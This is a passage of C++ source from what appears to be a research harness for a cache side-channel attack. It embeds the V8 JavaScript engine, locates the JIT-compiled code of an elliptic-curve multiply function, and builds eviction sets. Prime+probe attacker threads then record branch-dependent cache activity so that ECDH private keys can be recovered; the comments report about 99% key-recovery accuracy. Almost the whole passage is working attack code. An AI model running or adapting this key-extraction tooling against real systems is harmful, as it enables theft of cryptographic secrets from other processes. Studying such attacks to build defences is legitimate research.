							    detected_cache_lats.interrupt_thresh) {
								probe_time[slot][index] = scope_lat;
								sample_tsc[slot][index] = tsc1;
								index++;
							}
							prime_skx_sf_evset_ps_flush(
							    evset, sf_chain, array_repeat, l2_repeat);
						}
					} while (tsc1 - tsc0 < max_exec_cycles &&
					         index < profile_iterations);
				}

				hits[j] = index;
				log_info("Key %d slot %d find %d hits", i, slot, index);
				if (slot == 0) {
					/* a re-captured key re-uses r0..r<runs-1> of the same
					 * directory (reset on j == 0), so the bad attempt's
					 * traces are overwritten, not accumulated. */
					snprintf(dump_dir,
					         sizeof(dump_dir),
					         "%s/%s_key%05d",
					         run_tag,
					         test_name,
					         i);
					dump_profiling_traces(dump_dir,
					                      victim_runs,
					                      sample_tsc,
					                      probe_time,
					                      cache_line_count,
					                      profile_iterations,
					                      j == 0);
				}
				pthread_barrier_wait(&attacker_local_barrier);
			}

			/* --- re-validate this slot's line on the key we just captured */
			uint64_t med = median_u64(hits, victim_runs);
			int last_attempt = attempt + 1 >= max_key_attempts;
			/* an idle slot has no line to be in band, and rebuilding an
			 * eviction set it does not have would be nonsense */
			int bad = !idle && g_bands_enabled &&
			          (med < (uint64_t)slot_min_hits[slot] ||
			           med > (uint64_t)slot_max_hits[slot]);
			log_info("Key %d slot %d attempt %d: median hits=%lu "
			         "(want %d..%d) -> %s",
			         i,
			         slot,
			         attempt,
			         med,
			         slot_min_hits[slot],
			         slot_max_hits[slot],
			         bad ? "DEGRADED" : "ok");

			/* -csi gets the verdict as a diagnostic only: its evsets come
			 * from the fingerprint scan, so rebuilding them with the
			 * known-address prepare_evset would defeat the point. Only the
			 * known-address path runs the rebuild/re-capture handshake, and
			 * the victim loop skips its end-of-key barrier to match. */
			if (!g_retry_enabled) {
				break;
			}
			g_slot_bad[slot] = bad;

			pthread_barrier_wait(&attacker_local_barrier); /* verdicts */

			if (!idle && g_slot_bad[slot] && !last_attempt) {
				rebuild_slot_evset(slot, &evset, &scope, &sf_chain);
			}
			if (slot == 0) {
				/* only common(slot0) + true(slot2) feed the decoder */
				g_key_retry = !last_attempt && (g_slot_bad[0] || g_slot_bad[2]);
				if (g_key_retry) {
					log_warn("Key %d: evset degraded (common=%s true=%s) "
					         "-> rebuilt, re-capturing key",
					         i,
					         g_slot_bad[0] ? "bad" : "ok",
					         g_slot_bad[2] ? "bad" : "ok");
				} else if (g_slot_bad[0] || g_slot_bad[2]) {
					/* rebuilding could not fix it -> same per-process
					 * problem the build-time check catches; the keys
					 * captured so far are on disk and fine. */
					log_error("Key %d: still out of band after %d attempts "
					          "(common=%s true=%s) -- stopping, relaunch "
					          "the binary",
					          i,
					          max_key_attempts,
					          g_slot_bad[0] ? "bad" : "ok",
					          g_slot_bad[2] ? "bad" : "ok");
					exit(1);
				}
			}
			/* rebuilds finished + g_key_retry published */
			pthread_barrier_wait(&attacker_local_barrier);

			if (slot == 0) {
				/* release the victim, which reads g_key_retry to decide
				 * between re-running this key and moving to the next */
				pthread_barrier_wait(sync_ctx.barrier);
			}
			if (!g_key_retry) {
				break;
			}
		}
	}
	return NULL;
}

static int v8_ecdh_csi(void) {
	config_t *cfg = get_config();

	/* victim wrote jit_machine_code into sync_ctx.data before barrier #1 */
	memcpy(&jit_machine_code, sync_ctx.data, sizeof(uintptr_t));
	log_info("CSI: jit_machine_code=%p", (void *)jit_machine_code);
	for (int ci = 0; ci < cache_line_count; ++ci) {
		target_addr[ci] = jit_machine_code + cl_offset[ci];
		log_info("CSI %s: addr=%p page_slot=%u",
		         csi_cl_label(ci),
		         (void *)target_addr[ci],
		         (unsigned)((target_addr[ci] & (PAGE_SIZE - 1)) >> CL_SHIFT));
	}

	pthread_barrier_wait(sync_ctx.barrier); /* #2: victim enters eval loop */

	for (int ki = 0; ki < cache_line_count; ++ki) {
		sample_tsc[ki] = sample_tsc_arr[ki];
		probe_time[ki] = probe_time_arr[ki];
	}

	uint32_t target_page_slot[cache_line_count];
	for (int ci = 0; ci < cache_line_count; ++ci) {
		target_page_slot[ci] =
		    (uint32_t)((target_addr[ci] & (PAGE_SIZE - 1)) >> CL_SHIFT);
	}

	int found = 0;
	int csi_pass = 0;
	for (int ci = 0; ci < cache_line_count; ++ci) {
		csi_best[ci].score = csi_q_reject;
		csi_best[ci].matched = 0;
		csi_best_set[ci] = -1;
	}
	/* full 2-pass scan: always sweep everything so best-of quality wins */
	do {
		for (int l3_set = 0; l3_set < (int)cfg->l3.sets; ++l3_set) {
			uint32_t page_slot = (uint32_t)(l3_set % NUM_PAGE_SLOTS);

			int relevant = 0;
			for (int ci = 0; ci < cache_line_count; ++ci) {
				if (ci == 1 && !csi_scan_cl1) {
					continue;
				}
				if (!evsets[ci] && page_slot == target_page_slot[ci]) {
					relevant = 1;
					break;
				}
			}
			if (!relevant) {
				continue;
			}

			EVSet *evset = get_sf_kth_evset(l3_set);
			if (!evset) {
				log_warn("CSI: no evset for l3_set=%d", l3_set);
				continue;
			}

			/* probe with keys a, b, c; the counts are the classification */
			int kcnt[cache_line_count] = {};
			for (int ki = 0; ki < cache_line_count; ++ki) {
				char key_path[512];
				snprintf(key_path,
				         sizeof(key_path),
				         "%s/%s",
				         cfg->project_root,
				         csi_probe_keys[ki]);
				snprintf(
				    (char *)sync_ctx.data, sync_ctx_data_size, "%s", key_path);
				sync_ctx_set_action(SYNC_CTX_SET_KEY);
				pthread_barrier_wait(sync_ctx.barrier); /* A */
				pthread_barrier_wait(sync_ctx.barrier); /* B */

				memset(sample_tsc_arr[ki],
				       0,
				       sizeof(uint64_t) * profile_iterations);
				memset(probe_time_arr[ki],
				       0,
				       sizeof(uint64_t) * profile_iterations);
				uint64_t *ki_tsc[1] = { sample_tsc_arr[ki] };
				uint64_t *ki_probe[1] = { probe_time_arr[ki] };
				PS_profile_once(evset,
				                0,
				                profile_iterations,
				                csi_max_exec_cycles,
				                ki_tsc,
				                ki_probe);

				int cnt = 0;
				while (cnt < profile_iterations &&
				       sample_tsc_arr[ki][cnt] != 0) {
					++cnt;
				}
				kcnt[ki] = cnt;
			}

			/* Report only what has signal. The gate is on the LOG and the
			 * DUMP, never on the match below: a candidate is still scored
			 * whatever it read, so raising this floor can only ever cost
			 * diagnostics, never a target. */
			int max_cnt = 0;
			for (int ki = 0; ki < cache_line_count; ++ki) {
				if (kcnt[ki] > max_cnt) {
					max_cnt = kcnt[ki];
				}
			}
			if (max_cnt >= csi_report_min_hits) {
				csi_cands_reported++;
				log_info("CSI l3_set=%d(%x) cnt=(%d,%d,%d) u=(%.2f,%.2f,%.2f)",
				         l3_set,
				         l3_set,
				         kcnt[0],
				         kcnt[1],
				         kcnt[2],
				         csi_gap_uniformity(sample_tsc_arr[0], kcnt[0]),
				         csi_gap_uniformity(sample_tsc_arr[1], kcnt[1]),
				         csi_gap_uniformity(sample_tsc_arr[2], kcnt[2]));
				snprintf(dump_dir,
				         sizeof(dump_dir),
				         "%s/%s_csi",
				         run_tag,
				         test_name);
				dump_profiling_trace(dump_dir,
				                     l3_set,
				                     sample_tsc,
				                     probe_time,
				                     cache_line_count,
				                     profile_iterations);
			} else {
				csi_cands_quiet++;
			}

			for (int ci = 0; ci < cache_line_count; ++ci) {
				if (ci == 1 && !csi_scan_cl1) {
					continue;
				}
				if (page_slot != target_page_slot[ci]) {
					continue;
				}
				/* keep the highest-quality evset per target */
				struct csi_quality quality =
				    csi_score_candidate(ci, kcnt, sample_tsc_arr);
				if (quality.score > csi_best[ci].score) {
					csi_best[ci] = quality;
					csi_best_set[ci] = l3_set;
					evsets[ci] = evset;
					csi_log_quality(csi_cl_label(ci), l3_set, quality);
				}
			}
		}
	} while (++csi_pass < 2);

	/* Say WHICH set each line landed on, not just whether it landed. A bare
	 * "common=ok true=MISSING" leaves nothing to go back to the scan log or
	 * the candidate dumps with, and it stays silent about the false arm --
	 * which is a target like any other when -scancl1 is on and simply never
	 * hunted otherwise, two states a boolean cannot tell apart. */
	auto slot_status = [](int ci, char *buf, size_t n) {
		if (ci == 1 && !csi_scan_cl1) {
			snprintf(buf, n, "not scanned (-scancl1 to enable)");
		} else if (evsets[ci]) {
			snprintf(buf,
			         n,
			         "l3_set %d(%x) score=%.2f",
			         csi_best_set[ci],
			         csi_best_set[ci],
			         csi_best[ci].score);
		} else {
			snprintf(buf, n, "MISSING");
		}
	};
	char st_common[96], st_false[96], st_true[96];
	slot_status(0, st_common, sizeof(st_common));
	slot_status(1, st_false, sizeof(st_false));
	slot_status(2, st_true, sizeof(st_true));

	found = (evsets[0] ? 1 : 0) + (evsets[2] ? 1 : 0);
	/* cl1 is looked for but never required: measured 0 finds in 6 consecutive
	 * launches where cl0 and cl2 were acquired every time, so requiring it
	 * discarded every otherwise-good scan. Slot 1 idles without it. */
	int missing = !evsets[0] || !evsets[2];
	if (missing) {
		log_error("CSI: missing target(s) -- common=%s | true/ones=%s | "
		          "false/zeros=%s",
		          st_common,
		          st_true,
		          st_false);
		sync_ctx_set_action(SYNC_CTX_EXIT);
		pthread_barrier_wait(sync_ctx.barrier); /* A */
		return 1;
	}

	log_info("CSI: reported %d candidates, %d silent ones neither logged nor "
	         "dumped (< %d hits on every probe key)",
	         csi_cands_reported,
	         csi_cands_quiet,
	         csi_report_min_hits);
	log_info("CSI: acquired -- common=%s | true/ones=%s | false/zeros=%s",
	         st_common,
	         st_true,
	         st_false);
	log_info("CSI: common (count %.2f gaps %.2f spacing %.2f), "
	         "true (count %.2f gaps %.2f spacing %.2f)",
	         csi_best[0].count,
	         csi_best[0].gaps,
	         csi_best[0].spacing,
	         csi_best[2].count,
	         csi_best[2].gaps,
	         csi_best[2].spacing);

	{
		char key_path[512];
		snprintf(key_path,
		         sizeof(key_path),
		         "%s/%s/ec_key_0.json",
		         cfg->project_root,
		         ec_key_pool_rpath);
		snprintf((char *)sync_ctx.data, sync_ctx_data_size, "%s", key_path);
		sync_ctx_set_action(SYNC_CTX_SET_KEY);
		pthread_barrier_wait(sync_ctx.barrier); /* A */
		pthread_barrier_wait(sync_ctx.barrier); /* B */
	}

	/* release the single-process victim service loop */
	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier); /* A (EXIT, no B) */
	return 0;
}

/* pthread entry for single-process CSI: runs the fingerprint scan while
 * the main V8 thread services derives. */
static void *csi_thread_fn(void *arg) {
	(void)arg;
	v8_ecdh_csi();
	return NULL;
}

/* UNREACHABLE, AND DELIBERATELY KEPT. main() always calls
 * v8_ecdh_thread_main; this is the cross-process variant, which needs a
 * separate victim process to talk to over the sync context and cannot be
 * launched from here.
 *
 * Deleting it costs key-recovery accuracy. Measured 2026-08-27, three
 * launches of 10 keys x 10 runs each, decoded with extract_ecdh.py:
 *
 *   this file as it stands          99.8 / 98.6 / 99.4 %
 *   with this function deleted      70.5 / 83.9 / 70.1 %
 *   with an inert padding static    98.9 / 99.8 / 99.9 %
 *
 * so it is the ~4KB TEXT SHIFT that hurts, not the edit: moving
 * v8_ecdh_thread_main changes which cache sets the victim-side code lands
 * in, and it then competes with the eviction sets the attackers build. The
 * padding row is the control -- perturbing BSS instead is harmless.
 *
 * Anything that changes the size of the code ABOVE the victim loop has to
 * be re-measured the same way. See NOTES.md, "Code layout is load-bearing".
 */
int v8_ecdh_process_main(int argc, char *argv[]) {
	if (cache_env_init(1)) {
		log_error("Failed to initialize cache env!\n");

		return 0;
	}

	init_sync_ctx(V8_PROJ_ID);
	pthread_barrier_wait(sync_ctx.barrier); /* #1: wait for victim init done */

	jit_machine_code = ((uintptr_t *)sync_ctx.data)[0];

	log_info("Get jit code start %p", jit_machine_code);

	helper_thread_ctrl hctrl;

	if (LLCF_multi_evset(0, &hctrl)) {
		log_error("Failed to build evset");
		pthread_barrier_wait(sync_ctx.barrier);
		sync_ctx_set_action(SYNC_CTX_EXIT);
		pthread_barrier_wait(sync_ctx.barrier);
		return 1;
	}

	if (v8_ecdh_csi()) {
		return 1;
	}
	pthread_barrier_wait(sync_ctx.barrier);

	pthread_t thread_attacker = 0;
	uint32_t slot0 = 0, slot1 = 1, slot2 = 2;
	pthread_barrier_init(&attacker_local_barrier, NULL, cache_line_count);
	int err;

	err = pthread_create(&thread_attacker, NULL, v8_attacker_thread, &slot0);
	err = pthread_create(&thread_attacker, NULL, v8_attacker_thread, &slot1);
	err = pthread_create(&thread_attacker, NULL, v8_attacker_thread, &slot2);
	(void)err;

	for (int i = 0; i < key_num; ++i) {
		char key_path[512];
		snprintf(key_path,
		         sizeof(key_path),
		         "%s/%s/ec_key_%d.json",
		         get_config()->project_root,
		         ec_key_pool_rpath,
		         i);
		snprintf((char *)sync_ctx.data, sync_ctx_data_size, "%s", key_path);
		sync_ctx_set_action(SYNC_CTX_SET_KEY);
		pthread_barrier_wait(sync_ctx.barrier); /* A */
		pthread_barrier_wait(sync_ctx.barrier); /* B */

		for (int j = 0; j < 10; ++j) {
			sync_ctx_set_action(SYNC_CTX_START);
			pthread_barrier_wait(sync_ctx.barrier); /* A */
			pthread_barrier_wait(sync_ctx.barrier); /* B */
		}

		for (int j = 0; j < victim_runs; ++j) {
			sync_ctx_set_action(SYNC_CTX_START);
			pthread_barrier_wait(sync_ctx.barrier); /* A */
			pthread_barrier_wait(sync_ctx.barrier); /* B */
		}
	}

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier); /* A */
	pthread_join(thread_attacker, NULL);
	return 0;
}

int v8_ecdh_thread_main(int argc, char *argv[]) {
	reset_sync_ctx(V8_PROJ_ID);

	v8::V8::SetFlagsFromString("--always-turbofan --single-threaded");
	v8::V8::SetFlagsFromCommandLine(&argc, argv, true);
	v8::V8::InitializeICUDefaultLocation(argv[0]);
	std::unique_ptr<v8::Platform> platform = v8::platform::NewDefaultPlatform();
	v8::V8::InitializePlatform(platform.get());
	v8::V8::Initialize();

	v8::Isolate::CreateParams create_params;
	create_params.array_buffer_allocator =
	    v8::ArrayBuffer::Allocator::NewDefaultAllocator();
	v8::Isolate *isolate = v8::Isolate::New(create_params);
	{
		isolate->SetJitCodeEventHandler(
		    v8::kJitCodeEventDefault, [](const v8::JitCodeEvent *event) {
			    if (event->type != v8::JitCodeEvent::CODE_ADDED) {
				    return;
			    }
			    if (event->code_type != v8::JitCodeEvent::JIT_CODE) {
				    return;
			    }
			    if (event->script.IsEmpty()) {
				    return;
			    }
			    log_debug("JIT event %.*s: code_start=%p len=%zu",
			              event->name.len,
			              event->name.str,
			              event->code_start,
			              event->code_len);
			    const char target[] = "JS:*mul :6644:37";
			    if (event->name.len == sizeof(target) - 1 &&
			        memcmp(event->name.str, target, event->name.len) == 0) {
				    jit_machine_code =
				        reinterpret_cast<uintptr_t>(event->code_start);
				    g_jit_events++;
				    log_info(LOG_BOLD_ON
				             "Get target address to %p (code_len=%zu, "
				             "false_off=0x%lx true_off=0x%lx)" LOG_BOLD_OFF,
				             jit_machine_code,
				             event->code_len,
				             ecdh_false_branch_offset,
				             ecdh_true_branch_offset);
				    if (ecdh_false_branch_offset >= event->code_len ||
				        ecdh_true_branch_offset >= event->code_len) {
					    log_error("branch offsets fall OUTSIDE mul()'s "
					              "generated code (len %zu) -- they must be "
					              "re-derived for this V8 build",
					              event->code_len);
				    }
			    }
		    });

		v8::Isolate::Scope iscope(isolate);

		v8::HandleScope scope(isolate);
		v8::TryCatch try_catch(isolate);

		v8::Local<v8::ObjectTemplate> global = v8::ObjectTemplate::New(isolate);
		global->Set(
		    isolate, "rdtscp", v8::FunctionTemplate::New(isolate, Rdtscp));
		global->Set(isolate, "read", v8::FunctionTemplate::New(isolate, Read));
		global->Set(isolate,
		            "readbuffer",
		            v8::FunctionTemplate::New(isolate, ReadBuffer));
		global->Set(
		    isolate, "print", v8::FunctionTemplate::New(isolate, Print));
		v8::Local<v8::Context> context =
		    v8::Context::New(isolate, nullptr, global);

		v8::Context::Scope cscope(context);

		{
			const char *source_str = read_file(argv[1]);
			const char *repeat_str = read_file(argv[2]);
			const char *set_keypair_template = read_file(argv[3]);

			log_trace("source: %s\n", source_str);
			log_trace("repeat: %s\n", repeat_str);

			log_info("V8 runtime load script");
			v8::Local<v8::String> source =
			    v8::String::NewFromUtf8(isolate, source_str).ToLocalChecked();

			v8::Local<v8::Script> script =
			    v8::Script::Compile(context, source).ToLocalChecked();

			v8::Local<v8::Value> result = script->Run(context).ToLocalChecked();

			{
				v8::Local<v8::String> repeat_src =
				    v8::String::NewFromUtf8(isolate, repeat_str)
				        .ToLocalChecked();

				v8::Local<v8::Script> repeat_script =
				    v8::Script::Compile(context, repeat_src).ToLocalChecked();

				v8::Local<v8::Value> repeat_script_result =
				    repeat_script->Run(context).ToLocalChecked();

				v8::Local<v8::Function> repeat_func =
				    repeat_script_result.As<v8::Function>();

				log_info("v8 runtime jit warmup (%d runs)", jit_warmup_runs);
				int jit_cnt = jit_warmup_runs;
				for (int i = 0; i < jit_cnt; ++i) {
					v8::MaybeLocal<v8::Value> maybe_result =
					    repeat_func
					        ->Call(context, context->Global(), 0, nullptr)
					        .ToLocalChecked();
					v8::Local<v8::Value> result;
					if (!maybe_result.ToLocal(&result)) {
						v8::String::Utf8Value error(isolate,
						                            try_catch.Exception());
						log_error("JIT warmup script error: %s\n",
						          *error ? *error : "unknown error");
					}
				}

				log_info("\n\n");

				if (cache_env_init(1)) {
					log_error("Failed to initialize cache env!\n");
					return 0;
				}

				if (jit_machine_code == 0) {
					log_error("JIT warmup did not produce optimized code for "
					          "the target (jit_machine_code=0). Either the "
					          "hardcoded JIT name no longer matches the "
					          "function (check the 'JS:*mul :NNNN:37' line "
					          "number against the eval script) or warmup is "
					          "too short -- raise -warmup=. Every eviction "
					          "set would otherwise be built from a raw "
					          "offset and the capture would be silently "
					          "dead.");
					exit(1);
				}
				if (g_jit_events != 1) {
					log_warn("target was JIT-compiled %d times during warmup; "
					         "the eviction sets use the LAST address, and a "
					         "further recompile mid-run would invalidate them",
					         g_jit_events);
				}

				for (int i = 0; i < cache_line_count; ++i) {
					target_addr[i] = jit_machine_code + cl_offset[i];
					log_info("cl%d : %p", i, (void *)target_addr[i]);
					evsets[i] = NULL;
				}

				/* Profile one line over a few test derives and return its
				 * median hit count. Used by BOTH paths: the known-address
				 * one validates what it just built, and the CSI one
				 * validates what the scan handed it. */
				auto validate_line = [&](int slot) -> uint64_t {
					g_val_stop = 0;
					g_val_go = 0;
					pthread_t vt;
					pthread_create(
					    &vt, NULL, v8_validator_thread, evsets[slot]);
					enum { N_PROBE = 12 };
					uint64_t counts[N_PROBE];
					for (int n = 0; n < N_PROBE; ++n) {
						g_val_ready = 0;
						g_val_go = 1;
						repeat_func->Call(
						    context, context->Global(), 0, nullptr);
						g_val_go = 0;
						while (!g_val_ready) {
						}
						counts[n] = g_val_count;
					}
					g_val_stop = 1;
					pthread_join(vt, NULL);
					return median_u64(counts, N_PROBE);
				};

				if (use_csi) {
					((uintptr_t *)sync_ctx.data)[0] = jit_machine_code;

					helper_thread_ctrl hctrl;

					int evset_built = 0, llcf_retry = 5;
					for (int attempt = 1; attempt <= llcf_retry && !evset_built;
					     ++attempt) {
						evset_built = !LLCF_multi_evset(0, &hctrl);
						if (!evset_built) {
							log_error("CSI: LLCF_multi_evset failed "
							          "(attempt %d/%d)",
							          attempt,
							          llcf_retry);
						}
					}
					if (!evset_built) {
						return 0;
					}

					int csi_ok = 0, csi_retry = 1;
					for (int attempt = 1; attempt <= csi_retry && !csi_ok;
					     ++attempt) {
						if (attempt > 1) {
							log_warn("CSI: re-scanning (attempt %d/%d) against "
							         "the evset pool already built",
							         attempt,
							         csi_retry);
						}
						csi_reset_scan_state();

						((uintptr_t *)sync_ctx.data)[0] = jit_machine_code;

						pthread_t csi_thread = 0;
						pthread_create(&csi_thread, NULL, csi_thread_fn, NULL);

						v8_runtime_csi_victim_loop(isolate,
						                           context,
						                           repeat_func,
						                           set_keypair_template);
						pthread_join(csi_thread, NULL);

						/* must match the requirement inside the scan, or a
						 * missing cl1 slips through here and the capture
						 * runs two attackers instead of three */
						if (!evsets[0] || !evsets[2]) {
							log_warn("CSI: not all evsets found on attempt %d",
							         attempt);
							continue;
						}

						int csi_val_ok = 1;
						for (int i = 0; i < cache_line_count; ++i) {
							if (i == 1) {
								continue; /* the spare; unused by the decoder */
							}
							uint64_t med = validate_line(i);
							log_info(
							    "CSI VALIDATE slot %d (%s): median hits=%lu "
							    "(want %d..%d)",
							    i,
							    csi_cl_label(i),
							    med,
							    slot_min_hits[i],
							    slot_max_hits[i]);
							if (g_bands_enabled &&
							    (med < (uint64_t)slot_min_hits[i] ||
							     med > (uint64_t)slot_max_hits[i])) {
								csi_val_ok = 0;
							}
						}
						if (!csi_val_ok) {
							log_warn(
							    "CSI: scanned evsets do not hold up in the "
							    "capture on attempt %d",
							    attempt);
							continue;
						}
						csi_ok = 1;
						log_info(
						    "CSI: evsets acquired and validated on attempt "
						    "%d, proceeding to attack",
						    attempt);
					} /* csi_attempt */
					if (!csi_ok) {
						log_error("CSI: no usable evsets after %d scans of "
						          "the pool -- this launch's physical mapping "
						          "is the problem, relaunch (no capture "
						          "written)",
						          csi_retry);
						exit(1);
					}
				} else {
					/* Build + VALIDATE: after building the evsets, profile
					 * each line over a few test derives and check its median
					 * hit count against the same band the per-key check uses.
					 * Whether a line is usable is decided per PROCESS -- the
					 * JIT page's physical mapping changes from launch to
					 * launch, so a line can share a cache set with a hot one
					 * and then fire every iteration no matter how often its
					 * evset is rebuilt (measured: 1 launch in 5 had the true
					 * line stuck at ~270 instead of ~126 through 30 rebuilds,
					 * another had every line inflated). Catch that here, in
					 * seconds, instead of after a whole run of dead traces. */
					int val_ok = 0;
					for (int va = 0; va < 8 && !val_ok; ++va) {
						helper_thread_ctrl hctrl;
						if (start_helper_thread(&hctrl)) {
							_error("Failed to start helper!\n");
							return 0;
						}
						for (int i = 0; i < cache_line_count; ++i) {
							evsets[i] = NULL;
							if (i == 1 && g_no_slot1) {
								log_info("slot 1: -noslot1, leaving unprobed");
								continue;
							}
							for (int r = 0; r < retry && evsets[i] == NULL;
							     ++r) {
								evsets[i] =
								    prepare_evset((u8 *)target_addr[i], &hctrl);
							}
							if (evsets[i] == NULL) {
								log_error("failed to build evset");
								exit(1);
							}
						}
						stop_helper_thread(&hctrl);

						val_ok = 1;
						for (int i = 0; i < cache_line_count; ++i) {
							if (evsets[i] == NULL) {
								continue; /* -noslot1: nothing to validate */
							}
							uint64_t med = validate_line(i);
							log_info("VALIDATE attempt %d slot %d (%s): "
							         "median hits=%lu (want %d..%d)",
							         va,
							         i,
							         csi_cl_label(i),
							         med,
							         slot_min_hits[i],
							         slot_max_hits[i]);
							if (g_bands_enabled &&
							    (med < (uint64_t)slot_min_hits[i] ||
							     med > (uint64_t)slot_max_hits[i])) {
								val_ok = 0;
							}
						}
					}
					if (!val_ok) {
						log_error(
						    "VALIDATE: lines stayed out of band after 8 "
						    "rebuilds -- this launch's physical mapping is "
						    "unusable, relaunch the binary (no capture "
						    "written)");
						exit(1);
					}
					/* only this (single-process) victim loop implements the
					 * end-of-key handshake the attackers use to re-validate
					 * and rebuild their evsets. */
					g_retry_enabled = 1;
				}

				for (int i = 0; i < cache_line_count; ++i) {
					sample_tsc[i] = sample_tsc_arr[i];
					probe_time[i] = probe_time_arr[i];
				}

				pthread_t thread_attacker = 0;
				uint32_t slot0 = 0, slot1 = 1, slot2 = 2;
				/* Slot 1 runs only if it has a line to probe. The
				 * known-address path always builds one; -csi leaves
				 * evsets[1] NULL unless -scancl1 found a false arm. The
				 * barrier has to be sized to match or the attackers hang. */
				log_info("V8 starting %d attacker threads (slot 1 %s)",
				         cache_line_count,
				         evsets[1] ? "active" : "idle, no evset");
				pthread_barrier_init(
				    &attacker_local_barrier, NULL, cache_line_count);
				int err;
				err = pthread_create(
				    &thread_attacker, NULL, v8_attacker_thread, &slot0);
				err = pthread_create(
				    &thread_attacker, NULL, v8_attacker_thread, &slot1);
				err = pthread_create(
				    &thread_attacker, NULL, v8_attacker_thread, &slot2);

				log_info("V8 check value %p",
				         *(uint64_t *)(uintptr_t)jit_machine_code);
				log_info("V8 wait attacker");
				pthread_barrier_wait(sync_ctx.barrier);
				log_info("V8 start eval func");
				for (int i = 0; i < key_num; ++i) {
					char set_keypair_str[4096];
					char ec_key_pool_path[256];
					/* victim must load the per-key file ec_key_<i>.json from
					 * the pool DIRECTORY (template does
					 * read('%s/ec_key_%d.json')); passing csi_probe_keys[2]
					 * made %s a FILE path -> invalid
					 * ".../ec_key_csi_10.json/ec_key_<i>.json" and read()
					 * failed, so captures used no real key. */
					if (single_key_file != NULL) {
						sprintf(ec_key_pool_path,
						        "%s/%s",
						        get_config()->project_root,
						        single_key_file);
					} else if (csi_keys_capture) {
						/* -csikeys: capture the three CSI PROBE keys through
						 * the known-address path, so their fingerprints can
						 * be inspected on eviction sets that are known good.
						 * key00000/1/2 are csi_probe_keys[0/1/2] in order,
						 * so the key directories line up with the columns of
						 * the probe keys. -probekeys= changes what they are. */
						sprintf(ec_key_pool_path,
						        "%s/%s",
						        get_config()->project_root,
						        csi_probe_keys[i % cache_line_count]);
					} else {
						sprintf(ec_key_pool_path,
						        "%s/%s/ec_key_%d.json",
						        get_config()->project_root,
						        ec_key_pool_rpath,
						        i);
					}
					/* template is read('%s'): pass the full key file path */
					sprintf(set_keypair_str,
					        set_keypair_template,
					        ec_key_pool_path);

					log_debug("set key script: %s", set_keypair_str);
					v8::Local<v8::String> set_keypair_src =
					    v8::String::NewFromUtf8(isolate, set_keypair_str)
					        .ToLocalChecked();

					v8::Local<v8::Script> set_keypair_script =
					    v8::Script::Compile(context, set_keypair_src)
					        .ToLocalChecked();

					v8::MaybeLocal<v8::Value> maybe_result;
					maybe_result = set_keypair_script->Run(context);
					v8::Local<v8::Value> result;
					if (!maybe_result.ToLocal(&result)) {
						v8::String::Utf8Value error(isolate,
						                            try_catch.Exception());
						log_error("Set key pair script failed: %s\n",
						          *error ? *error : "unknown error");
						log_error("set_keypair_str:\n%s", set_keypair_str);
					}

					for (int j = 0; j < 10; ++j) {
						maybe_result = repeat_func->Call(
						    context, context->Global(), 0, nullptr);
						if (!maybe_result.ToLocal(&result)) {
							v8::String::Utf8Value error(isolate,
							                            try_catch.Exception());
							log_error("Repeat script failed: %s\n",
							          *error ? *error : "unknown error");
						}
					}

					/* The attackers re-validate their lines at every key
					 * boundary; when one degraded they rebuild it and ask
					 * for this key to be captured again (g_key_retry). */
					for (;;) {
						for (int j = 0; j < victim_runs; ++j) {
							pthread_barrier_wait(sync_ctx.barrier);
							maybe_result = repeat_func->Call(
							    context, context->Global(), 0, nullptr);

							if (!maybe_result.ToLocal(&result)) {
								v8::String::Utf8Value error(
								    isolate, try_catch.Exception());
								log_error("Repeat script failed: %s\n",
								          *error ? *error : "unknown error");
							}
						}
						if (!g_retry_enabled) {
							break;
						}
						/* end of key: pairs with slot0 once it has validated
						 * and, if needed, rebuilt the eviction sets */
						pthread_barrier_wait(sync_ctx.barrier);
						if (!g_key_retry) {
							break;
						}
						log_warn("Key %d: re-running after evset rebuild", i);
					}
					sleep(1);
				}
				pthread_join(thread_attacker, NULL);
			}
		}
	}
	isolate->Dispose();
	v8::V8::Dispose();
	v8::V8::DisposePlatform();
	delete create_params.array_buffer_allocator;
	return 0;
}

int main(int argc, char *argv[]) {
	/* our own options are stripped here; everything left is passed on to
	 * V8 (which requires its flags AFTER the 3 script paths). */
	int new_argc = 0;
	for (int i = 0; i < argc; ++i) {
		if (strcmp(argv[i], "-csi") == 0) {
			use_csi = 1;
		} else if (strncmp(argv[i], "-keys=", 6) == 0) {
			key_num = atoi(argv[i] + 6);
		} else if (strncmp(argv[i], "-runs=", 6) == 0) {
			victim_runs = atoi(argv[i] + 6);
		} else if (strncmp(argv[i], "-tag=", 5) == 0) {
			snprintf(run_tag, sizeof(run_tag), "%s", argv[i] + 5);
		} else if (strncmp(argv[i], "-cl=", 4) == 0) {
			/* -cl=0xe00,0xec0,0xfc0 -- probe three arbitrary offsets into
			 * the JIT code instead of the built-in ones, so the usable
			 * lines can be found by sweeping rather than by reading a
			 * disassembly. Slot 0 stays the clock and slot 2 the marker as
			 * far as the rest of the pipeline is concerned. */
			const char *v = argv[i] + 4;
			for (int c = 0; c < cache_line_count && v != NULL; ++c) {
				cl_offset[c] = strtoull(v, NULL, 0);
				v = strchr(v, ',');
				if (v != NULL) {
					v += 1;
				}
			}
			log_info("cl_offset overridden: %#lx %#lx %#lx",
			         cl_offset[0],
			         cl_offset[1],
			         cl_offset[2]);
		} else if (strncmp(argv[i], "-clocku=", 8) == 0) {
			csi_min_clock_uniformity = strtod(argv[i] + 8, NULL);
		} else if (strncmp(argv[i], "-keyfile=", 9) == 0) {
			single_key_file = argv[i] + 9;
		} else if (strcmp(argv[i], "-csikeys") == 0) {
			csi_keys_capture = 1;
		} else if (strcmp(argv[i], "-noslot1") == 0) {
			/* Leave the false arm unprobed on the KNOWN-ADDRESS path, the
			 * way -csi leaves it when the scan finds no cl1. Its thread
			 * still runs and still meets every barrier, it just primes and
			 * probes nothing, so this isolates the cost of the third
			 * concurrent eviction set from everything else. */
			g_no_slot1 = 1;
		} else if (strcmp(argv[i], "-scancl1") == 0) {
			csi_scan_cl1 = 1;
		} else if (strncmp(argv[i], "-scancl1=", 9) == 0) {
			csi_scan_cl1 = atoi(argv[i] + 9);
		} else if (strncmp(argv[i], "-probekeys=", 11) == 0) {
			const char *v = argv[i] + 11;
			for (int c = 0; c < cache_line_count && v != NULL && *v; ++c) {
				const char *comma = strchr(v, ',');
				size_t n = comma ? (size_t)(comma - v) : strlen(v);
				if (n >= sizeof(probe_keys_override[c])) {
					n = sizeof(probe_keys_override[c]) - 1;
				}
